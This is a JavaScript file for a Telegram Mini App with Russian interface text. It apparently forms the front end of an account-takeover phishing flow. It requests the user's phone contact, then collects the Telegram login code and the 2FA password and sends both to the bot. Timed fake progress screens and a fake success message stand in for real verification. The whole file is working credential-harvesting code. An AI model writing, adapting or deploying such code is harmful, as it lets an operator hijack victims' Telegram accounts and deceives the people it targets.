document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('2faInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    let currentStep = 'contact';  // Шаги: contact, code, 2fa

    loginBtn.addEventListener('click', () => {
        console.log('Login button clicked');
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();
        currentStep = 'contact';

        // Прямой вызов requestContact (отправляет contact боту)
        Telegram.WebApp.requestContact((contact) => {
            console.log('Contact received via direct callback:', contact);
            if (contact && contact.phone_number) {
                phoneInput.value = contact.phone_number;
                phoneInput.classList.remove('hidden');
                hideLoading();
                statusMsg.textContent = 'Номер получен. Отправляем SMS...';
                tg.HapticFeedback.impactOccurred('light');
                
                // Автоматический переход к полю кода после получения контакта (SMS отправится от бота)
                setTimeout(() => {
                    console.log('Auto-transition to code input');
                    phoneInput.classList.add('hidden');
                    codeInput.classList.remove('hidden');
                    submitBtn.classList.remove('hidden');
                    submitBtn.textContent = 'Отправить код';
                    statusMsg.textContent = 'Введите SMS-код из Telegram (проверьте чат).';
                    currentStep = 'code';
                }, 2000);  // 2 секунды для UX (ожидание SMS)
            } else {
                console.error('Contact denied or empty');
                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
                errorMsg.classList.remove('hidden');
                setTimeout(resetForm, 2000);
            }
        }, (error) => {
            console.error('Request contact error:', error);
            hideLoading();
            errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
            errorMsg.classList.remove('hidden');
            setTimeout(resetForm, 2000);
        });
    });

    submitBtn.addEventListener('click', () => {
        const step = currentStep;
        let payload = {};
        console.log('Submit clicked, step:', step);

        if (step === 'code') {
            const code = codeInput.value.trim();
            if (!code) {
                errorMsg.textContent = 'Введите код.';
                errorMsg.classList.remove('hidden');
                return;
            }
            payload = { action: 'verify_code', code: code };
            console.log('Sending code data:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Проверяем код...';
            tg.HapticFeedback.impactOccurred('medium');
            // Автоматический переход к 2FA (бот сообщит, если нужно)
            setTimeout(() => {
                console.log('Auto-transition to 2FA input');
                hideLoading();
                codeInput.classList.add('hidden');
                twoFaInput.classList.remove('hidden');
                submitBtn.textContent = 'Подтвердить 2FA';
                statusMsg.textContent = 'Если 2FA настроен, введите пароль (иначе оставьте пустым).';
                currentStep = '2fa';
            }, 2000);
            return;
        }

        if (step === '2fa') {
            const password = twoFaInput.value;
            payload = { action: 'verify_2fa', password: password };
            console.log('Sending 2FA data:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Подтверждаем 2FA...';
            tg.HapticFeedback.impactOccurred('heavy');
            setTimeout(() => {
                console.log('Auto-transition to success');
                hideLoading();
                successMsg.classList.remove('hidden');
                submitBtn.classList.add('hidden');
                tg.HapticFeedback.notificationOccurred('success');
                setTimeout(() => tg.close(), 3000);
            }, 3000);
            return;
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
        console.log('Showing loading');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
        console.log('Hiding loading');
    }

    function resetForm() {
        console.log('Resetting form');
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        statusMsg.textContent = '';
    }

    tg.onEvent('webAppDataSent', () => {
        console.log('WebApp data sent');
        tg.HapticFeedback.impactOccurred('light');
    });
});
